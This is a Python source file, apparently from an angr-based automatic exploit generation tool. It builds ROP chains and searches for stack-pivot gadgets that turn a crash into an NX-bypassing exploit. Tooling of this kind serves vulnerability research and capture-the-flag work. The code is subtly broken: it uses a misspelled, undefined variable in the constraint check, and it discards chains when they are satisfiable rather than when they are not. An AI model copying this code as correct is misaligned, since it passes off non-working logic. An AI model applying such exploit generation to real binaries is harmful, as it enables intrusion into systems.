import os
import angr

import logging
l = logging.getLogger("rex.exploit.Exploit")

class NonExploitableCrash(Exception):
    pass

class CannotExploit(Exception):
    pass

class CannotBypassNX(CannotExploit):
    pass

class ImproperCircumstances(CannotExploit):
    pass

class Exploit(object):
    '''
    Exploit object which can leak flags or set registers
    '''

    def __init__(self, crash, use_rop_cache=True, rop_cache_file=None):
        '''
        :param crash: an exploitable crash object
        :param use_rop_cache: should rop gadgets be cached?
        :param rop_cache_file: which filename to use for a rop cache
        '''

        if not crash.exploitable():
            raise NonExploitableCrash("crash cannot be exploited")

        self.crash = crash
        self.use_rop_cache = use_rop_cache
        self.rop_cache_file = rop_cache_file

        self.binary = crash.binary
        self.state = crash.state.copy()

        if use_rop_cache and rop_cache_file is None:
            self.rop_cache_file = os.path.join("/tmp", "%s-rop" % os.path.basename(self.binary))

        # let's put together our rop gadgets
        self._p = angr.Project(self.binary)
        self.rop_engine = self._p.analyses.ROP()

    def initialize(self):

        l.info("accumulating rop gadgets")

        if self.use_rop_cache:
            try:
                self.rop_engine.load_gadgets(self.rop_cache_file)
            except IOError:
                self.rop_engine.find_gadgets_single_threaded()
                self.rop_engine.save_gadgets(self.rop_cache_file)
        else:
            self.rop_engine.find_gadgets()

    def _eip_overwrite_with_chain(self, chain):
        '''
        exploit an eip overwrite using rop
        '''

        sp = self.state.se.any_int(self.state.regs.sp)

        # first let's see what kind of stack control we have
        symbolic_stack = self._stack_control()
        if len(symbolic_stack) == 0:
            l.warning("no controlled data beneath stack, need to resort to shellcode")
            raise CannotBypassNX("no controlled data beneath sp")


        chain_addr = None
        stack_pivot = None
        # loop until we can find a chain which gets us to our setter gadget
        for addr in symbolic_stack:
            # increase payload length by 4 for the final ip hijack
            chain_req = chain.payload_len + 4

            # is the space too small?
            if not symbolic_stack[addr] >= chain_req:
                continue

            # okay we have a symbolic region which fits and is below sp
            # can we pivot there?
            for gadget in self.rop_engine.gadgets:
                # let's make sure the gadget is sane

                # TODO: consult state before throwing out a gadget, some of these memory
                # accesses might be acceptable
                if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
                    continue

                # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
                # as we're not interested in the ret's effect on stack movement, because when the
                # ret executes we'll have chain control
                jumps_to = sp + (gadget.stack_change - 4)
                # does it hit the controlled region?
                if jumps_to >= addr and jumps_to < addr + symbolic_stack[addr]:
                    # it lands in a controlled region, but does our chain fit?
                    offered_size = symbolic_stack[addr] - (jumps_to - addr)
                    if offered_size >= chain_req:
                        # we're in!
                        chain_addr = jumps_to
                        stack_pivot = gadget

                        # test to see if things are still satisfiable
                        extra_constraints = [ ]

                        extra_constraints.append(self.state.regs.ip == stack_pivot.addr)
                        mem = self.state.memory.load(chain_addr, chain.payload_len)

                        cbvv = self.state.BVV(chain)
                        extra_constraints.append(mem == cbvv)

                        if self.state.satisfiable(extra_constraints=extra_constriants):
                            continue

                        exploit_state = self.state.copy()

                        # constrain eip to equal the stack_pivot
                        exploit_state.add_constraints(exploit_state.regs.ip == stack_pivot.addr)
                        return (exploit_state, chain_addr, offered_size)

        raise CannotBypassNX("unable to create a suitable chain")

    def _stack_control(self):
        '''
        determine what symbolic memory we control equal to or beneath sp
        '''

        control = { }

        if self.state.se.symbolic(self.state.regs.sp):
            l.warning("detected symbolic sp when guaging stack control")
            return control

        sp = self.state.se.any_int(self.state.regs.sp)
        for addr in self.crash.symbolic_mem:
            # if the region is above sp it gets added
            if addr > sp:
                control[addr] = self.crash.symbolic_mem[addr]

            # if sp falls into the region it gets added starting at sp
            if sp <= addr + self.crash.symbolic_mem[addr]:
                control[sp] = addr + self.crash.symbolic_mem[addr] - sp

        return control

    def _global_control(self):
        '''
        determine what symbolic memory we control which is at a constant address
        '''

        control = { }

        # PIE binaries will give no global control without knowledge of the binary base
        if self._p.loader.main_bin.pic:
            return control

        for addr in self.crash.symbolic_mem:
            if addr >= self._p.loader.main_bin.get_min_addr() and addr < self._p.loader.main_bin.get_max_addr():
                control[addr] = self.crash.symbolic_mem[addr]

        return control
